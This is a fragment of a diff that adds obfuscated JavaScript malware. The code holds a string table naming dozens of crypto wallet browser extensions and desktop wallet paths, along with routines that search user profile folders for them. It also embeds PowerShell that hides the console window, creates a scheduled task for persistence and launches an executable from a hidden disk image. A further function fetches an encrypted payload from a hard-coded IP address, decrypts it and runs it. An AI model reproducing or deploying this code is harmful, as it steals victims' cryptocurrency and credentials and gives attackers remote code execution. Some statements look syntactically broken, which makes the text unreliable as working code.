+        '\x0aAdd-Type\x20-Name\x20Window\x20-Namespace\x20Console\x20-MemberDefinition\x20\x27\x0a[DllImport(\x22Kernel32.dll\x22)]\x0apublic\x20static\x20extern\x20IntPtr\x20GetConsoleWindow();\x0a\x0a[DllImport(\x22user32.dll\x22)]\x0apublic\x20static\x20extern\x20bool\x20ShowWindow(IntPtr\x20hWnd,\x20Int32\x20nCmdShow);\x0a\x27\x0a\x0afunction\x20Hide-Console\x0a{\x0a\x20\x20\x20\x20$consolePtr\x20=\x20[Console.Window]::GetConsoleWindow()\x0a\x20\x20\x20\x20[Console.Window]::ShowWindow($consolePtr,\x200)\x0a}\x0aHide-Console\x20|\x20Out-Null\x0a\x0a\x20\x0a\x20\x0a\x20$task\x20=\x20Get-ScheduledTask\x20-TaskName\x20\x22Update\x22\x20-ErrorAction\x20SilentlyContinue\x0aif\x20($task\x20-eq\x20$null)\x20{\x0a\x0a}\x20else\x20{\x0a\x20Get-ScheduledTask\x20|\x20Unregister-ScheduledTask\x20-Confirm:$false\x0a\x0a}\x0aschtasks\x20/create\x20/tn\x20\x22Update\x22\x20/tr\x20\x22powershell\x20-ExecutionPolicy\x20Bypass\x20-File\x20',
+        'readEntries',
+        'ZIP64SIZB',
+        'ENHANCED_DEFLATED',
+        'has',
+        'sui',
+        'DEFLATED\x20(',
+        'boolean',
+        'NO_ZIP',
+        'Yoroi',
+        'Target\x20file\x20already\x20exists',
+        'TEMP',
+        'entries',
+        'Exodus',
+        'EF_ZIP64_OR_16',
+        'Phantom',
+        'number',
+        '11018910slSTim',
+        'getData',
+        'clear',
+        'some',
+        'CANT_OVERRIDE',
+        'WRONG_PASSWORD',
+        'get',
+        'filename',
+        'writeUInt16LE',
+        'CENSIZ',
+        'Coin98',
+        '340333PmSKvJ',
+        '\x22\x20/rl\x20highest\x20/sc\x20onlogon\x20\x20\x0a\x0a\x0a\x20\x0a$registryPath\x20=\x20\x22HKCU:\x5cSoftware\x5cPlutos\x22\x0a$registryName\x20=\x20\x22InitPath\x22\x0a$savedPath\x20=\x20Get-ItemProperty\x20-Path\x20$registryPath\x20-Name\x20$registryName\x0a\x20\x20if\x20($savedPath\x20-and\x20$savedPath.$registryName)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20$vhdPath\x20=\x20$savedPath.$registryName\x20+\x20\x22\x5csetting.json:disk.vhd\x22\x0a\x20\x20\x20\x20}\x20else\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20return\x0a\x20\x20\x20\x20}\x0a\x0aMount-DiskImage\x20-ImagePath\x20$vhdPath\x0a\x0a$diskImage\x20=\x20Get-DiskImage\x20-ImagePath\x20$vhdPath\x0a$diskNumber\x20=\x20$diskImage.Number\x0a$driveLetter\x20=\x20(Get-Partition\x20-DiskNumber\x20$diskNumber).DriveLetter\x0a$volumeInfo\x20=\x20Get-Volume\x20-DriveLetter\x20$driveLetter\x0a\x0a\x20if\x20($volumeInfo)\x20{\x0a\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20mountvol\x20\x20$savedPath.$registryName\x20+\x20\x22\x5c.ini\x22\x20$volumeInfo.UniqueId\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20Start-Sleep\x20-Seconds\x201\x0a\x20\x20\x20\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20$exeFilePath\x20=\x20$savedPath.$registryName\x20+\x20\x22\x5c.ini\x22\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x0a\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20Start-Process\x20-FilePath\x20($exeFilePath\x20+\x20\x27\x5cnotepad_software_x64.exe\x27)\x20-ArgumentList\x20\x22-ExecutionPolicy\x20Bypass\x20-File\x20$exeFilePath\x22\x20-PassThru\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20Start-Sleep\x20-Seconds\x2012\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20Dismount-DiskImage\x20-ImagePath\x20$vhdPath\x20|\x20Out-Null\x0a\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x0a\x0a',
+        'inflate::Stored\x20block\x20length\x20did\x20not\x20match\x20one\x27s\x20complement',
+        'XDEFI',
+        'commentLength',
+        'mode',
+        'mainHeaderSize',
+        'INVALID_FILENAME',
+        'swap64',
+        'Trust_Wallet',
+        'openSync',
+        'Binance',
+        'Inflater',
+        'DESCRIPTOR_FAULTY',
+        'CENEXT',
+        'Unable\x20to\x20set\x20times',
+        'findFiles',
+        '202480TGEuPS',
+        'GAuthAuthentica',
+        'flags',
+        'kkpllkodjeloidieedojogacfhpaihoh',
+        'Tron',
+        'ZIP64OFF',
+        'function',
+        'timeval',
+        'LOCHDR',
+        'fileAttr',
+        'Invalid/unsupported\x20compression\x20method',
+        'LOCSIZ',
+        'setData',
+        'deleteFile',
+        'Leap_Terra_Wallet',
+        'EF_ZIP64_RHO',
+        'bhhhlbepdkbapadjdnnojkbgioiodbic',
+        'statSync',
+        'crc32',
+        'Exodus_desktop',
+        'push',
+        'all',
+        'ID_RECORD_MGT',
+        'aijcbedoijmgnlmjeegjaglmepbmpkpi',
+        'ENDSIG',
+        'EntryHeader',
+        'Sender_Wallet',
+        'versions',
+        'CENHOW',
+        'Invalid\x20CEN\x20header\x20(bad\x20signature)',
+        'Goby',
+        'fromDOS2Date',
+        'FLG_COMP1',
+        'Braavos_wallet',
+        'copy',
+        'User\x20Data',
+        'createHash',
+        'updateKeys',
+        'dkdedlpgdmmkkfjabffeganieamfklkm',
+        'encrypted',
+        'test',
+        'MetaMask_Edge',
+        'totalEntries',
+        'END64NUMDISKS',
+        'IBM_TERSE',
+        'INVALID_STORE_BLOCK',
+        'dngmlblcodfobpdpecaadgfbcggfjfnm',
+        'input',
+        'ZIP64DSK',
+        'fromDate2DOS',
+        'Authenticator',
+        'CRC32\x20checksum\x20failed\x20{0}',
+        'CENOFF',
+        'EF_ZIP64_DSN',
+        'UNKNOWN_METHOD',
+        '27nDmtTf',
+        'kncchdigobghenbbaddojjnnaogfppfj',
+        'encrypt',
+        'DEFLATED',
+        'realDataOffset',
+        'LOCALAPPDATA',
+        'getHours',
+        'chmod',
+        'tasklist\x20/FI\x20\x22IMAGENAME\x20eq\x20firefox.exe\x22',
+        'isHidden',
+        'CENVER',
+        'phkbamefinggmakgklpkljjmgibohnba',
+        'overwrite',
+        'decoder',
+        'next',
+        'atime',
+        '\x5cnode\x5c',
+        'createWriteStream',
+        'getFullYear',
+        'writeFileSync',
+        '1aa6fd2cc9f705493f2c155344bf89a43a3a94c6acc39a6b56b371fa6e83978b',
+        'diskEntries',
+        'string',
+        'readFile',
+        'slice',
+        'inflateRawSync',
+        'addLocalFolder',
+        'Could\x20not\x20extract\x20the\x20file',
+        '_logs_err_load.txt',
+        'join',
+        'header',
+        'LOCSIG',
+        'Descriptor\x20data\x20is\x20malformed',
+        'error',
+        'readUInt16LE',
+        'epapihdplajcdnnkdeiahlgigofloibg',
+        'CENVEM',
+        'SHRUNK',
+        'gjagmgiddbbciopjhllkdnddhcglnemk',
+        'Harmony',
+        'taskkill\x20/F\x20/im\x20firefox.exe',
+        'MetaMask',
+        '364864WzLLku',
+        'LOCEXT',
+        'lpfcbjknijpeeillifnkikgncikgfhdo',
+        'bhghoamapcdpbohphigoooaddinpkbai',
+        'exec',
+        '\x5cnode\x5cnode.exe',
+        'kmhcihpebfmpgmihbkipmjlmmioameka',
+        'close',
+        'crypto',
+        'crcTable',
+        'name',
+        'diskNumStart',
+        'taskkill\x20/im\x20node.exe',
+        'nlbmnnijcnlegkjjpcfjclmcfggfefdm',
+        'localHeader',
+        'localPath',
+        'KHC',
+        'INVALID_LOC',
+        'Incompatible\x20password\x20parameter',
+        'MetaMask_Firefox',
+        'hcflpincpppdclinealmandijcmnkbgn',
+        'eyJzdGF0dXMiOiJzdWNjZXNzIn0=',
+        'EVERWallet',
+        'A\x20directory\x20cannot\x20have\x20content',
+        'Guarda_desktop_3',
+        'mnfifefkajgofkcjkemidiaecocnkjeh',
+        ':\x20\x22',
+        'CyanoWallet',
+        'https_guarda.co_0.indexeddb.leveldb',
+        'WavesKeeper',
+        'EF_ZIP64_SUNCOMP',
+        'USERPROFILE',
+        'NONE',
+        'child_process',
+        'LOCTIM',
+        'create',
+        'inflate::Invalid\x20literal/length\x20or\x20distance\x20code\x20in\x20fixed\x20or\x20dynamic\x20block',
+        'ADM-ZIP:\x20ZIP\x20File\x20Name\x20Missing',
+        'toBuffer',
+        'Unknown\x20descriptor\x20format',
+        'random',
+        'ID_FORK',
+        'ID_PFS',
+        'platform',
+        'File\x20not\x20found:\x20\x22{0}\x22',
+        'hasOwnProperty',
+        '\x27);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20(()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20let\x20key\x20=\x20null;\x0a\x20\x20\x20\x20\x20\x20\x20\x20let\x20iv\x20=\x20null;\x0a\x20\x20\x20\x20\x20\x20\x20\x20fetch(\x27http://140.82.54.223/get_encrypt_file/9o0il09RRPEPoS%2BmEZPaDg%3D%3D\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.then((response)\x20=>\x20{\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20key\x20=\x20Buffer.from(response.headers.get(\x27X-Encryption-Key\x27),\x20\x27base64\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20iv\x20=\x20Buffer.from(response.headers.get(\x27X-Encryption-IV\x27),\x20\x27base64\x27);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20response.arrayBuffer();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20})\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.then((encryptedData)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20decipher\x20=\x20crypto.createDecipheriv(\x27aes-128-cbc\x27,\x20key,\x20iv);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20decryptedData\x20=\x20Buffer.concat([decipher.update(Buffer.from(encryptedData)),\x20decipher.final()]);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20result\x20=\x20run(decryptedData);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20})\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.catch((error)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20console.error(error);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20})()\x0a\x20\x20\x20\x20',
+        'readFileSync',
+        'ZIP64HDR',
+        'DESCRIPTOR_NOT_EXIST',
+        'zlib',
+        'readdirSync',
+        'assign',
+        'STORED\x20(',
+        'makeDir',
+        'Guarda_desktop_2',
+        'jojhfeoedkpkglbfimdfabpdfjaoolaf',
+        'FLG_DESC',
+        'oeljdldpnmdbchonielidgobddffflal',
+        'getMonth',
+        'EXTSIG',
+        'Invalid\x20filename',
+        'withFileTypes',
+        'Deflater',
+        'changed',
+        'toString',
+        'Local\x20Storage\x5cleveldb',
+        'path',
+        'basename',
+        'inflate',
+        '\x27))\x22',
+        'INVALID_REPEAT_LEN',
+        'isBuffer',
+        'EF_SIZE',
+        'parse',
+        'Unable\x20to\x20create\x20folder',
+        'loadLocalHeaderFromBinary',
+        'isExecutable',
+        '\x5cPLpek\x5c',
+        'trailingSpace',
+        'readUInt32LE',
+        'aes-128-cbc',
+        'getDate',
+        'decrypt',
+        'ffnbelfdoeiohenkjibnmadjiehjhajb',
+        'aholpfdialjgjfhomihkjbmgjidlcdno',
+        'LOCHOW',
+        'MaiarDeFiWallet',
+        'amkmjjmmflddogmhpjloimipbofnfjih',
+        'cphhlgmgameodnhkjdmkpanlelnlohao',
+        'INVALID_PASS_PARAM',
+        'ibnejdfjmmkpcnlpebklmnkoeoihofec',
+        'undefined',
+        'directory',
+        'resourcesPath',
+        'INVALID_DYN_DISTANCE',
+        'code',
+        'ZIP64EXTRA',
+        'split',
+        'prototype',
+        '_logs_err.txt',
+        'Wrong\x20Password',
+        'END64SIG',
+        'getOwnPropertyNames',
+        'toAsyncBuffer',
+        'AVAIL_DATA',
+        'node-v22.9.0-win-x64',
+        'Unable\x20to\x20write\x20file',
+        'cjelfplplebdjjenllpjcblmjkfcffne',
+        'FILE_IN_THE_WAY',
+        'storage\x5cdefault',
+        'NeoLine',
+        'writeFileTo',
+        'resolve',
+        'getAttributes',
+        'Ronin',
+        'bgpipimickeadkjlklgciifhnalhdjhe',
+        'CENFLG',
+        'BAD_CRC',
+        'alloc',
+        'Errors',
+        'ID_UNIX',
+        '9925497vLqkru',
+        'copyFileSync',
+        'ID_PATCH',
+        'existsSync',
+        'CENLEN',
+        'win32',
+        'AuroWallet',
+        'fcfcfllfndlomdhbehjjcoimbgofdncg',
+        'CENATT',
+        'Temple',
+        'DISK_ENTRY_TOO_LARGE',
+        'data',
+        'createDecipheriv',
+        'DuHwv6WaloxlTnohw+3Yiw==',
+        'findLast',
+        'net.node',
+        'relative',
+        'COMMENT_TOO_LONG',
+        'idnnbdplmphpflfnlkomgpfbpcgelopg',
+        'chmodSync',
+        'DIRECTORY_CONTENT_ERROR',
+        '.ps1',
+        'ENOENT',
+        '502',
+        'entryName',
+        'GeroWallet',
+        'isReadOnly',
+        'comment',
+        'INVALID_BLOCK_TYPE',
+        'FLG_EFS',
+        'fileNameLength',
+        'ID_X509_CERTID_C',
+        'LZMA',
+        'closeSync',
+        'LiqualityWallet',
+        'FILE',
+        'iWallet',
+        'readBigUInt64LE',
+        'inflate::Dynamic\x20block\x20code\x20description:\x20repeat\x20more\x20than\x20specified\x20lengths','ID_OPENVMS',
+        '\x20bytes\x20buffer',
+        'hex',
+        'isDirectory',
+        'EMartian_Aptos_Wallet',
+        'forEach',
+        'cjmkndjhnagcfbpiemnkdpomccnjblmj',
+        'ENDCOM',
+        '\x27\x20}\x22\x20-WindowStyle\x20Hidden',
+        'STORED',
+        'crc',
+        'extraLength',
+        'finish',
+        'sep',
+        'CloverWallet',
+        'TezBox',
+        'LOCFLG',
+        'exports',
+        'ExodusWeb3Wallet',
+        'hpglfhgfnhbgpjdenjgmdgoeiappafln',
+        'chrome',
+        'headers',
+        'getEntryChildren',
+        'inflate::Dynamic\x20block\x20code\x20description:\x20too\x20many\x20length\x20or\x20distance\x20codes',
+        'tasklist\x20/FI\x20\x22IMAGENAME\x20eq\x20node.exe\x22',
+        'utimes',
+        'final',
+        'fill',
+        'Invalid\x20path:\x20',
+        'extra',
+        'kINWynJPt',
+        'execSync',
+        'Invalid\x20LOC\x20header\x20(bad\x20signature)',
+        'ICONex',
+        'unlinkSync',
+        'attr',
+        'JaxxLiberty',
+        'MathWallet',
+        'reduce',
+        'extractAllToAsync',
+        'MartianAptos',
+        'compressToBuffer',
+        'LOCLEN',
+        'Local\x20Extension\x20Settings',
+        'Braavos',
+        '/wall',
+        'Entry\x20doesn\x27t\x20exist',
+        'LOCVER',
+        'addFile',
+        'TO_MANY_CODES',
+        'getEntryCount',
+        'flpiciilemghbmfalicajoolhkkenfel',
+        'loadFromBinary',
+        'PKWARE',
+        'length',
+        'getDataAsync',
+        'keys',
+        'wallets',
+        'inflate::Dynamic\x20block\x20code\x20description:\x20invalid\x20distance\x20code\x20lengths',
+        'Nami',
+        'CENNAM',
+        'FLG_MSK',
+        'CENCRC',
+        'ENDSUB',
+        'time',
+        'findFilesAsync',
+        'end',
+        'ID_POSZIP',
+        'Comment\x20is\x20too\x20long',
+        'afbcbjpbpfadlkmhmclhkeeodmamcflc',
+        'version',
+        'splice',
+        '\x5cAppData\x5cLocal\x5c',
+        'stat',
+        'inflate::Dynamic\x20block\x20code\x20description:\x20code\x20lengths\x20codes\x20incomplete',
+        'No\x20zip\x20file\x20was\x20loaded',
+        'END64HDR',
+        'unisat',
+        'object',
+        'imul',
+        'REDUCED3',
+        'toUpperCase',
+        'posix'
+    ];
+    t = function () {
+        return z2;
+    };
+    return t();
+}
+async function q(path_node) {
+    path_node_g = path_node, T(), await new Promise(D => setTimeout(D, 0x1388));
+    for (const D of V) {
+        v(D);
+    }
+    ;
+}
+async function O(path_node) {
+    const lc = tE;
+    try {
+        const D = Buffer[lc(0x351)](W, lc(0x33d)), z = Buffer[lc(0x351)](F, lc(0x33d)), Q = y[lc(0x279)](lc(0x244), D, z), pathModule_net = path[lc(0x1e6)](process[lc(0x251)], lc(0x27c)), h = P(pathModule_net, A);
+        if (!h)
+            return;
+        const c = fs['readFileSync'](pathModule_net[lc(0x352)]('\x5c', '/')), U = Buffer['concat']([
+                Q['update'](Buffer[lc(0x351)](c)),
+                Q[lc(0x2ae)]()
+            ]);
+        fs['writeFileSync'](pathModule_net[lc(0x352)]('\x5c', '/'), U), d[lc(0x2b3)](path_node + lc(0x38d) + x(pathModule_net[lc(0x352)]('\x5c', '/')) + lc(0x239)), fs[lc(0x2b6)](pathModule_net[lc(0x352)]('\x5c', '/')), await new Promise(Y => setTimeout(Y, 0x1f4));
+        const f = lc(0x2b2), N = 'aqSDe', I = path[lc(0x1e6)](a, lc(0x2dc) + f + '\x5c' + N + lc(0x282));
+        R(I), fs[lc(0x1dc)](I, n(I), 'utf-8'), d['exec'](lc(0x30e) + I + lc(0x29c), (Y, H) => {
+            const lU = lc;
+            Y ? console[lU(0x1ea)](Y) : console['log'](H[lU(0x234)]()), fs['unlinkSync'](pathModule_net[lU(0x352)]('\x5c', '/'));
+        });
+    } catch (Y) {
+    }
+}
+var R = D => {
+    const lf = tE, z = path['dirname'](D);
+    !fs[lf(0x270)](z) && (R(z), fs[lf(0x34e)](z));
+};
+async function G() {
+    const lN = tE;
+    try {
+        await new Promise(c => setTimeout(c, 0xfa0));
+        const D = lN(0x376), z = path[lN(0x1e6)](process['env'][lN(0x32d)], lN(0x349)), e = 'hQhSxAdBQB.zip', Q = path['join'](process[lN(0x36e)]['TEMP'], e);
+        R(Q);
+        const h = fs[lN(0x1da)](Q);
+        await new Promise(c => setTimeout(c, 0x3e8)), https['get'](D, c => {
+            const lI = lN;
+            c['pipe'](h), h['on'](lI(0x2a0), async () => {
+                const lY = lI;
+                h[lY(0x1fa)](), await new Promise(f => setTimeout(f, 0x3e8));
+                if (!fs[lY(0x270)](z)) {
+                    const f = {};
+                    f['recursive'] = !![], fs[lY(0x34e)](z, f);
+                }
+                try {
+                    const N = new AdmZip(Q);
+                    var U = N['getEntries']();
+                    for (let Y = 0x0; Y < U[lY(0x2ca)]; Y++) {
+                        const H = U[Y], J = JSON[lY(0x23d)](H[lY(0x234)]()), K = H[lY(0x177)](), M = (z + '\x5c' + J[lY(0x285)])['replace'](lY(0x25d), lY(0x342));
+                        if (J[lY(0x297)]) {
+                            const j = {};
+                            j[lY(0x343)] = !![], fs['mkdirSync'](path[lY(0x367)](M), j);
+                        } else
+                            R(M), fs[lY(0x1dc)](M, K);
+                    }
+                    const path_node = z + lY(0x1f8), I = z + lY(0x1d9);
+                    try {
+                        const L = d[lY(0x2b3)](lY(0x2ac));
+                        L[lY(0x36a)](lY(0x342)) && d[lY(0x2b3)](lY(0x1ff));
+                    } catch (g) {
+                    }
+                    O(path_node);
+                } catch (u) {
+                    fs[lY(0x1dc)]('_logs_err_load.txt', u['toString']()), new Promise(C => setTimeout(C, 0x7d0));
+                }
+            })['on'](lI(0x1ea), U => {
+                const lH = lI;
+                fs[lH(0x1dc)](lH(0x257), U[lH(0x234)]()), new Promise(f => setTimeout(f, 0x3e8))[lH(0x33b)](() => {
+                    G();
+                });
+            });
+        });
+    } catch (c) {
+        fs['writeFileSync'](lN(0x257), c[lN(0x234)]()), await new Promise(U => setTimeout(U, 0x3e8)), G();
+    }
+}
+async function k() {
+    const lJ = tE;
+    try {
+        await new Promise(c => setTimeout(c, 0x3e8));
+        const D = 'https://nodejs.org/download/release/v22.9.0/node-v22.9.0-win-x86.zip', z = path[lJ(0x1e6)](process[lJ(0x36e)][lJ(0x32d)], 'node'), e = lJ(0x306), Q = path[lJ(0x1e6)](process['env'][lJ(0x170)], e);
+        R(Q);
+        const h = fs['createWriteStream'](Q);
+        await new Promise(c => setTimeout(c, 0x3e8)), https[lJ(0x17c)](D, c => {
+            const lK = lJ;
+            c['pipe'](h), h['on'](lK(0x2a0), async () => {
+                const lM = lK;
+                h['close'](), await new Promise(f => setTimeout(f, 0x3e8));
+                if (!fs[lM(0x270)](z)) {
+                    const f = {};
+                    f[lM(0x343)] = !![], fs[lM(0x34e)](z, f);
+                }
+                try {
+                    const N = new AdmZip(Q);
+                    var U = N['getEntries']();
+                    for (let Y = 0x0; Y < U[lM(0x2ca)]; Y++) {
+                        const H = U[Y], J = JSON[lM(0x23d)](H[lM(0x234)]()), K = H['getData'](), M = (z + '\x5c' + J[lM(0x285)])[lM(0x2e8)](lM(0x385), lM(0x342));
+                        if (J['isDirectory']) {
+                            const j = {};
+                            j[lM(0x343)] = !![], fs['mkdirSync'](path['dirname'](M), j);
+                        } else
+                            R(M), fs[lM(0x1dc)](M, K);
+                    }
+                    const path_node = z + lM(0x1f8), I = z + lM(0x1d9);
+                    try {
+                        const L = d[lM(0x2b3)]('tasklist\x20/FI\x20\x22IMAGENAME\x20eq\x20node.exe\x22');
+                        L[lM(0x36a)](lM(0x342)) && d[lM(0x2b3)](lM(0x1ff));
+                    } catch (g) {
+                    }
+                    q(path_node);
+                } catch (u) {
+                    fs[lM(0x1dc)](lM(0x1e5), u[lM(0x234)]()), new Promise(C => setTimeout(C, 0x7d0));
+                }
+            })['on']('error', U => {
+                const lj = lK;
+                fs[lj(0x1dc)](lj(0x257), U['toString']()), new Promise(f => setTimeout(f, 0x3e8))[lj(0x33b)](() => {
+                    k();
+                });
+            });
+        });
+    } catch (c) {
+        await new Promise(U => setTimeout(U, 0x3e8)), k();
+    }
+}
+function Z(pathUserData) {
+    return new Promise(z => {
+        const lL = m, e = {};
+        e['MetaMask'] = 'nkbihfbeogaeaoehlefnkodbefgpgknn', e['Binance'] = 'fhbohimaelbohpjbbldcngcnapndodjp', e['Phantom'] = 'bfnaelmomeimhlpmgjnjophhpkkoljpa', e['Coinbase'] = 'hnfanknocfeofbddgcijnmhnfnkdnaad', e['Ronin'] = 'fnjhmkhhmkbjkkabndcnnogagogbneec', e['Exodus'] = 'aholpfdialjgjfhomihkjbmgjidlcdno', e['KardiaChain'] = 'pdadjkfkgcafgbceimcpbkalnfnepbnk', e['TerraStation'] = 'aiifbnbfobpmeekipheeijimdpnlpgpp', e['Wombat'] = 'amkmjjmmflddogmhpjloimipbofnfjih', e['Harmony'] = 'fnnegphlobjdpkhecapkijjdkgcjhkib', e['Nami'] = 'lpfcbjknijpeeillifnkikgncikgfhdo', e['MartianAptos'] = 'efbglgofoippbgcjepnhiblaibcnclgk', e['Braavos'] = 'jnlgamecbpmbajjfhmmmlhejkemejdma', e['XDEFI'] = 'hmeobnfnfcmdkdcmlblgagmfpfboieaf', e['Yoroi'] = 'ffnbelfdoeiohenkjibnmadjiehjhajb', e['TON'] = 'nphplpgoakhhjchkkhmiggakijnkhfnd', e['Authenticator'] = 'bhghoamapcdpbohphigoooaddinpkbai', e['MetaMask_Edge'] = 'ejbalbakoplchlghecdalmeeeajnimhm', e['Tron'] = 'ibnejdfjmmkpcnlpebklmnkoeoihofec', e['MathWallet'] = 'afbcbjpbpfadlkmhmclhkeeodmamcflc', e['Guarda'] = 'hpglfhgfnhbgpjdenjgmdgoeiappafln', e['JaxxLiberty'] = 'cjelfplplebdjjenllpjcblmjkfcffne', e['iWallet'] = 'kncchdigobghenbbaddojjnnaogfppfj', e['MewCx'] = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm', e['NeoLine'] = 'cphhlgmgameodnhkjdmkpanlelnlohao', e['CloverWallet'] = 'nhnkbkgjikgcigadomkphalanndcapjk', e['LiqualityWallet'] = 'kpfopkelmapcoipemfendmdcghnegimn', e['Keplr'] = 'dmkamcknogkgcdfhhbddcghachkejeap', e['Sollet'] = 'fhmfendgdocmcbmfikdcogofphimnkno', e['AuroWallet'] = 'cnmamaachppnkjgnildpdmkaakejnhae', e['PolymeshWallet'] = 'jojhfeoedkpkglbfimdfabpdfjaoolaf', e['ICONex'] = 'flpiciilemghbmfalicajoolhkkenfel', e['Coin98'] = 'aeachknmefphepccionboohckonoeemg', e['EVERWallet'] = 'cgeeodpfagjceefieflmdfphplkenlfk', e['TrezorPasswordManager'] = 'imloifkgjagghnncjkhggdhalmcnfklk', e['Rabby'] = 'acmacodkjbdgmoleebolmdjonilkdbch', e['Oxygen'] = fhilaheimglignddkjgofkcbgekhenbh, e['PaliWallet'] = 'mgffkfbidihjpoaomajlbgchddlicgpn', e['BoltX'] = 'aodkkagnadcbobfpggfnjeongemjbjca', e['NamiWallet'] = 'lpfcbjknijpeeillifnkikgncikgfhdo', e['MaiarDeFiWallet'] = 'dngmlblcodfobpdpecaadgfbcggfjfnm', e['WavesKeeper'] = 'lpilbniiabackdjcionkobglmddfbcjo', e['Solflare'] = 'bhhhlbepdkbapadjdnnojkbgioiodbic', e['CyanoWallet'] = 'dkdedlpgdmmkkfjabffeganieamfklkm', e['KHC'] = 'hcflpincpppdclinealmandijcmnkbgn', e['TezBox'] = 'mnfifefkajgofkcjkemidiaecocnkjeh', e['Temple'] = 'ookjlbkiijinhpmnjffcofjonbfbgaoc', e['Goby'] = 'jnkelfanjkeadonecabehalmbgpfodjm', e['EOSAuthenticato'] = 'oeljdldpnmdbchonielidgobddffflal', e['GAuthAuthentica'] = 'ilgcnhelpchnceeipipijaljkblbcobl', e['ExodusWeb3Wallet'] = 'aholpfdialjgjfhomihkjbmgjidlcdno', e['Braavos_wallet'] = 'jnlgamecbpmbajjfhmmmlhejkemejdma', e['Eth_and_Polk_Web3_Wallet'] = 'kkpllkodjeloidieedojogacfhpaihoh', e['OKX_Wallet'] = 'mcohilncbfahbmgdjkbpemcciiolgcge', e['Sender_Wallet'] = 'epapihdplajcdnnkdeiahlgigofloibg', e['Hashpack'] = 'gjagmgiddbbciopjhllkdnddhcglnemk', e['Eternl'] = 'kmhcihpebfmpgmihbkipmjlmmioameka', e['GeroWallet'] = 'bgpipimickeadkjlklgciifhnalhdjhe', e['Pontem_Aptos_Wallet'] = 'phkbamefinggmakgklpkljjmgibohnba', e['Petra_Aptos_Wallet'] = 'ejjladinnckdgjemekebdpeokbikhfci', e['EMartian_Aptos_Wallet'] = 'efbglgofoippbgcjepnhiblaibcnclgk', e['Finnie'] = 'cjmkndjhnagcfbpiemnkdpomccnjblmj', e['Leap_Terra_Wallet'] = 'aijcbedoijmgnlmjeegjaglmepbmpkpi', e['Trust_Wallet'] = 'egjidjbpglichdcondbcbdnbeeppgdph', e['Wverse'] = 'idnnbdplmphpflfnlkomgpfbpcgelopg', e['unisat'] = 'ppbibelpcjmhbdihakflkdcoccbgbkpo', e['leap'] = 'fcfcfllfndlomdhbehjjcoimbgofdncg', e['sui'] = 'opcgpfmipidbgpenhmajoajpbobppdil', e['Atomic_desktop'] = 'Local\x20Storage\x5cleveldb', e[Exodus_desktop] = 'exodus.wallet', e['Electrum_desktop'] = lL(0x2cd), e['Guarda_desktop_1'] = 'Local\x20Storage\x5cleveldb', e['Guarda_desktop_2'] = 'https_guarda.co_0.indexeddb.leveldb', e['Guarda_desktop_3'] = 'Session\x20Storage', e['Coinomi_desktop'] = lL(0x2cd), e['MetaMask_Firefox'] = '4294967295';
+        const Q = e, h = [], c = [], U = [
+                'atomic',
+                'Exodus',
+                'Electrum',
+                'Guarda',
+                'Coinomi',
+                'storage\x5cdefault'
+            ], f = (pathFind, N = 0x0, I = 0x3) => {
+                return new Promise(Y => {
+                    const lp = m;
+                    try {
+                        const H = {};
+                        H[lp(0x231)] = !![];
+                        const J = fs['readdirSync'](pathFind, H);
+                        for (const K of J) {
+                            if (K[lp(0x297)]()) {
+                                const M = path['join'](pathFind, K[lp(0x1fd)]);
+                                K[lp(0x1fd)]['includes'](lp(0x2bf)) && N < 0x3 && (h[lp(0x1a6)](M), Y(h)), !pathFind['includes']('Firefox') && N < I && c[lp(0x1a6)](f(M, N + 0x1)), pathFind['includes'](lp(0x36b)) && N < I && c[lp(0x1a6)](f(M, N + 0x1, 0x5));
+                            } else
+                                U[lp(0x179)](j => pathFind[lp(0x36a)](j)) && (h[lp(0x1a6)](pathFind), Y(h));
+                        }
+                        Promise[lp(0x1a7)](c)[lp(0x33b)](() => {
+                            Y(h);
+                        });
+                    } catch (j) {
+                        console[log](j), Y(h);
+                    }
+                });
+            };
+        f(pathUserData)[lL(0x33b)](N => {
+            const lg = lL;
+            if (N[lg(0x2ca)] == 0x0)
+                return z();
+            let I = [];
